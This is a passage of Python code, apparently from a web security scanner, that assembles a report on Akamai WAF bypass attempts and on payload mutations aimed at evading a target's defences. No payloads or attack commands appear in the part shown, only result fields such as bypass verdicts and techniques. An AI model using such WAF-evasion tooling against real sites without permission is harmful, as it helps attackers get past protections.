                "activated": len(self.akamai_fallback_results) > 0,
                "total_payloads": len(self.akamai_fallback_results),
                "bypasses_confirmed": sum(1 for r in self.akamai_fallback_results if r.get("bypass_confirmed")),
                "behavior_changes": sum(1 for r in self.akamai_fallback_results if r.get("verdict") == "BEHAVIOR CHANGE"),
                "results": [
                    {
                        "endpoint": r["endpoint"],
                        "generator": r["generator"],
                        "description": r.get("description", "")[:100],
                        "verdict": r.get("verdict", "UNKNOWN"),
                        "status_code": r.get("status_code"),
                        "evidence": r.get("evidence", "")[:200],
                    }
                    for r in self.akamai_fallback_results
                    if r.get("verdict") in ("AKAMAI BYPASS CONFIRMED", "BEHAVIOR CHANGE")
                ][:10],
            },
            "recursive_fallback": {
                "activated": len(self.fallback_results) > 0,
                "error_captures": len(self.fallback_results),
                "techs_identified": self.fallback_techs_identified,
                "mutations_generated": self.fallback_mutations_generated,
                "mutations_successful": self.fallback_mutations_successful,
                "results": [
                    {
                        "endpoint": r["endpoint"],
                        "original_status": r["original_status"],
                        "tech_identified": r["tech_identified"],
                        "evasion_focus": r["evasion_focus"],
                        "known_bypasses": r["known_bypasses"][:3],
                        "mutations_sent": r["mutations_sent"],
                        "mutations_different": r["mutations_different_response"],
                        "mutations_successful": r["mutations_successful"],
                        "error_body_snippet": r["error_body_snippet"][:300],
                        "mutation_results": [
                            {
                                "index": m["index"],
                                "technique": m["technique"],
                                "generation": m["generation"],
                                "verdict": m.get("verdict", "UNKNOWN"),
                                "status_code": m.get("status_code"),
                                "description": m.get("description", "")[:100],
                            }
                            for m in r["mutation_results"][:10]
                        ],
                    }
                    for r in self.fallback_results
                ],
            },
            "incident_absorber": self.incident_absorber.to_dict(),
        }

